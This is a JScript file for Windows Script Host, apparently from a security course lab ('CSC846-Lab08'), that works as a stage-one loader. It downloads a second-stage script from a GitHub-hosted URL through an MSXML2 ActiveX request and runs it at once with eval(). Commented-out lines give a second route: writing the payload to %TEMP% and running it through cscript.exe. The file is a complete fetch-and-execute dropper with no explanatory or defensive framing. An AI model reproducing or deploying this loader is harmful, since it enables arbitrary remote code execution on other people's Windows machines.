// write_debug: Used to show debugging output.
function write_debug(str_to_write) {
    if(debug) { // Switch is below
        try{
            //console.log(str_to_write); // In IE, console only works if devtools is open.
            WScript.Echo(str_to_write); // In IE, console only works if devtools is open.
        } catch(e) {
            try {
                WScript.Echo("Error :" + str_to_write); // A lot of popups but provides information.
            } catch(e) {
                // Otherwise, nothing.
            }
        }
    }
}

var debug = true; // Whether write_debug will do anything.

var remoteUrl = "https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/remote_stage2.js"; // Replace with your actual URL
//var fso = new ActiveXObject("Scripting.FileSystemObject");
//var shell = new ActiveXObject("WScript.Shell");
//var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%"); //write_debug(tempFolder);
//var localPath = tempFolder + "\\" + "stage1.js"; //Path to save the file//var localPath = path.join(tempFolder, 'stage1.js');// no browser support
try {
    // Stage 2 Step 1: Download the script content
    var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0"); //Alternative// var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", remoteUrl, false); // Synchronous request
    xhr.send();
    try {
        if (xhr.status === 200) {
            var stage2Content = xhr.responseText; //write_debug("stage1Content: " + stage1Content);
            //Stage 2 Step 2: execute remoet content
            eval(stage2Content);
            // Stage 1 Step 2: Save the content to a local file
            // var fso = new ActiveXObject("Scripting.FileSystemObject"); //write_debug("localPath: " + localPath);
            // var file = fso.CreateTextFile(localPath, true); //
            //file.Write(stage1Content);
            //file.Close();
            // Stage 1 Step 3: Execute the local file using cscript.exe. The command line to run cscript on the downloaded file
            //var cscriptCommand = "cscript.exe //NoLogo \"" + localPath + "\"";
            // var command = shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
            //shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
            write_debug("Script executed stage 2 successfully.");
        } else {
            write_debug("Failed to download script. Status: " + xhr.status);
        }
    } catch(e) {
        write_debug("HTTP RESPONSE ERROR DETAILS:");
        write_debug("An error code: " + e.number);
        write_debug("An error message: " + e.message);
        write_debug("An error description: " + e.description);
    }
} catch (e) {
    write_debug("HTTP GET ERROR DETAILS:");
    write_debug("An error code: " + e.number);
    write_debug("An error message: " + e.message);
    write_debug("An error description: " + e.description);
}
